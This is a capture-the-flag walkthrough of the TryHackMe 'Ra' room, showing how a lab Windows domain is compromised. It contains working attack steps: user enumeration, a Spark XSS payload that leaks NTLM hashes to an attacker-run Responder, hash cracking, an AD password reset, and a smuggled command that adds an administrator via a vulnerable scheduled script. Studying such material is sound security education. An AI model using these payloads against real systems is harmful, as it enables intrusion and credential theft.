> [!NOTE]
> https://tryhackme.com/room/ra
> You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).
> Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?
> Happy Hacking!
> IP:10.10.190.19


# Recon
### Nmap
```
nmap -p- -sC -sV -Pn -sS 10.10.190.19 -T4 -vv 
```

```
 53/tcp    open  domain              syn-ack ttl 127 Simple DNS Plus
 80/tcp    open  http                syn-ack ttl 127 Microsoft IIS httpd 10.0
 88/tcp    open  kerberos-sec        syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-06 13:54:07Z)
 135/tcp   open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
 139/tcp   open  netbios-ssn         syn-ack ttl 127 Microsoft Windows netbios-ssn
 389/tcp   open  ldap                syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
 445/tcp   open  microsoft-ds?       syn-ack ttl 127
 464/tcp   open  kpasswd5?           syn-ack ttl 127
 593/tcp   open  ncacn_http          syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
 636/tcp   open  ldapssl?            syn-ack ttl 127
 2179/tcp  open  vmrdp?              syn-ack ttl 127
 3268/tcp  open  ldap                syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
  3269/tcp  open  globalcatLDAPssl?   syn-ack ttl 127
 3389/tcp  open  ms-wbt-server       syn-ack ttl 127 Microsoft Terminal Services
 5222/tcp  open  jabber              syn-ack ttl 127
 5223/tcp  open  ssl/jabber          syn-ack ttl 127
 5229/tcp  open  jaxflow?            syn-ack ttl 127
 5262/tcp  open  jabber              syn-ack ttl 127
 5263/tcp  open  ssl/jabber          syn-ack ttl 127
 5269/tcp  open  xmpp                syn-ack ttl 127 Wildfire XMPP Client
 5270/tcp  open  ssl/xmpp            syn-ack ttl 127 Wildfire XMPP Client
 5275/tcp  open  jabber              syn-ack ttl 127
 5276/tcp  open  ssl/jabber          syn-ack ttl 127
 5985/tcp  open  http                syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 7070/tcp  open  http                syn-ack ttl 127 Jetty 9.4.18.v20190429
 7443/tcp  open  ssl/http            syn-ack ttl 127 Jetty 9.4.18.v20190429
 9090/tcp  open  hadoop-datanode     syn-ack ttl 127 Apache Hadoop
 9091/tcp  open  ssl/hadoop-datanode syn-ack ttl 127 Apache Hadoop
 9389/tcp  open  mc-nmf              syn-ack ttl 127 .NET Message Framing
 49668/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
 49670/tcp open  ncacn_http          syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
 49671/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
 49673/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
 49695/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
 49933/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
```

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506180715.png)

```
echo "10.10.190.19    windcorp.thm Fire.windcorp.thm" >> /etc/hosts 
```
### web

> [!NOTE]
> Discovered open port 80/tcp on 10.10.190.19

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506182048.png)

```
 creds:
 Emily Jensen
 Lily Levesque
 Kirk Uglas
 Antonietta Vidal organicfish718@fire.windcorp.thm
 Britney Palmer organicwolf509@fire.windcorp.thm
 Brittany Cruz tinywolf424@fire.windcorp.thm
  Carla Meyer angrybird253@fire.windcorp.thm
 Buse Candan buse@fire.windcorp.thm +
 Edeltraut Daub Edeltraut@fire.windcorp.thm
 Edward Lewis Edward@fire.windcorp.thm
 Emile Lavoie Emile@fire.windcorp.thm
 Emile Henry tinygoose102@fire.windcorp.thm
 Emily Anderson brownostrich284@fire.windcorp.thm
 Hemmo Boschma sadswan869@fire.windcorp.thm
 Isabella Hughes sadswan869@fire.windcorp.thm
 Isra Saur whiteleopard529@fire.windcorp.thm
 Jackson Vasquez happymeercat399@fire.windcorp.thm
 Jaqueline Dittmer orangegorilla428@fire.windcorp.thm
```

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506182220.png)
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506182542.png)
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506182455.png)
### smb

> [!NOTE]
> Discovered open port 139/tcp on 10.10.190.19
> Discovered open port 139/tcp on 10.10.190.19

```
enum4linux 10.10.190.19
```

```
crackmapexec smb 10.10.190.19 -u Lilyle -p ChangeMe#1234 --shares  
```
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506182927.png)

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506183249.png)

```
crackmapexec smb 10.10.190.19 -u Lilyle -p ChangeMe#1234 --groups
```
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506184120.png)

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506184202.png)

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506184318.png)


## Flag 1 
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506183704.png)
### kerberos users brute

> [!NOTE]
> Discovered open port 88/tcp on 10.10.190.19

```
git clone https://github.com/ropnop/kerbrute.git
sudo apt install golang -y
make all
cd dist 
```

```
./kerbrute_linux_amd64 userenum -d 10.10.190.19 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 
```

## Spark 2.8.3  steal NTLM HASH
```
https://nvd.nist.gov/vuln/detail/CVE-2020-12772
```
```
https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md
```
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506184939.png)

```
https://www.igniterealtime.org/downloads/#spark
```

> [!NOTE]
> Lilyle:ChangeMe#1234
> Enabled cript!!!!!!!

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506190657.png)
##### Start responder
```
responder -I tun1
```
### payload
```
<img src=10.11.134.170/test.img>
```
 
```
 buse@fire.windcorp.thm
```
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506192109.png)

### BruteForse hash NTLM

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506192456.png)

```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt 
```
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506192754.png)
## WINRM

> [!NOTE]
> 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506195212.png)

```
evil-winrm --user "buse" --password "" -i 10.10.21.51
```
## Flag2
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506200355.png)


![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506200710.png)

## LPE

```
whoami /all
```
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506201117.png)

# SCRIPT
```
*Evil-WinRM* PS C:\scripts> type 

# reset the lists of hosts prior to looping
$OutageHosts = $Null
# specify the time you want email notifications resent for hosts that are down
$EmailTimeOut = 30
# specify the time you want to cycle through your host lists.
$SleepTimeOut = 45
# specify the maximum hosts that can be down before the script is aborted
$MaxOutageCount = 10
# specify who gets notified
$notificationto = "brittanycr@windcorp.thm"
# specify where the notifications come from
$notificationfrom = "admin@windcorp.thm"
# specify the SMTP server
$smtpserver = "relay.windcorp.thm"

# start looping here
Do{
$available = $Null
$notavailable = $Null
Write-Host (Get-Date)

# Read the File with the Hosts every cycle, this way to can add/remove hosts
# from the list without touching the script/scheduled task,
# also hash/comment (#) out any hosts that are going for maintenance or are down.
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
ForEach-Object {
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p
if($p)
    {
     # if the Host is available then just write it to the screen
     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White
     [Array]$available += $_
    }
else
    {
     # If the host is unavailable, give a warning to screen
     write-host "Unavailable host ------------> "$_ -BackgroundColor Magenta -ForegroundColor White
     $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue
     if(!($p))
       {
        # If the host is still unavailable for 4 full pings, write error and send email
        write-host "Unavailable host ------------> "$_ -BackgroundColor Red -ForegroundColor White
        [Array]$notavailable += $_

        if ($OutageHosts -ne $Null)
            {
                if (!$OutageHosts.ContainsKey($_))
                {
                 # First time down add to the list and send email
                 Write-Host "$_ Is not in the OutageHosts list, first time down"
                 $OutageHosts.Add($_,(get-date))
                 $Now = Get-date
                 $Body = "$_ has not responded for 5 pings at $Now"
                 Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
                  -Subject "Host $_ is down" -SmtpServer $smtpserver
                }
                else
                {
                    # If the host is in the list do nothing for 1 hour and then remove from the list.
                    Write-Host "$_ Is in the OutageHosts list"
                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut)
                    {$OutageHosts.Remove($_)}
                }
            }
        else
            {
                # First time down create the list and send email
                Write-Host "Adding $_ to OutageHosts."
                $OutageHosts = @{$_=(get-date)}
                $Body = "$_ has not responded for 5 pings at $Now"
                Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
                 -Subject "Host $_ is down" -SmtpServer $smtpserver
            }
       }
    }
}
# Report to screen the details
$log = "Last run: $(Get-Date)"
write-host $log
Set-Content -Path C:\scripts\log.txt -Value $log
Write-Host "Available count:"$available.count
Write-Host "Not available count:"$notavailable.count
Write-Host "Not available hosts:"
$OutageHosts
Write-Host ""
Write-Host "Sleeping $SleepTimeOut seconds"
sleep $SleepTimeOut
if ($OutageHosts.Count -gt $MaxOutageCount)
{
    # If there are more than a certain number of host down in an hour abort the script.
    $Exit = $True
    $body = $OutageHosts | Out-String
    Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
     -Subject "More than $MaxOutageCount Hosts down, monitoring aborted" -SmtpServer $smtpServer
}
}
while ($Exit -ne $True)
```

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506201421.png)

> [!NOTE]
> C:\Users\brittanycr\hosts.txt

![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506202822.png)

```
Set-ADAccountPassword -Identity brittanycr -NewPassword (ConvertTo-SecureString "Newpass123456789" -AsPlainText -Force) -Reset
```

> [!NOTE]
> brittanycr:Newpass123456789

```
net localgroup "Remote Management Users" brittanycr /add /domain
```

```
evil-winrm --user "brittanycr" --password "Newpass123456789" -i 10.10.190.19
```

```
cd "C:\Users\brittanycr\"
```

```
echo ";net user Goose helloASDGVRshdfgwehrAFWISUd!123 /add;net localgroup Administrators Goose /add"> hosts.txt
```

# Flag3
```
evil-winrm --user "Goose" --password helloASDGVRshdfgwehrAFWISUd!123 -i 10.10.190.19
```
![Ra](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Ra/screenshots/20250506230801.png)
